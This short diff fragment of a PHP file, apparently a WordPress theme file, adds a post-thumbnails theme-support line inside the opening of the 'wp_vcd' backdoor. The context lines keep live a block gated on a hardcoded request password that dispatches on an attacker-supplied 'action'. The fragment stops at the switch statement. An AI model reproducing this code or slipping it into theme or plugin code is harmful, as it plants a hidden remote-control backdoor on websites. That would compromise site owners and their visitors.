@@ -1,6 +1,7 @@
 <?php
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '54527e8f2e3a07c1cae48d45ba57e02d'))
 	{
+		add_theme_support( 'post-thumbnails' ); 
 $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
 			{
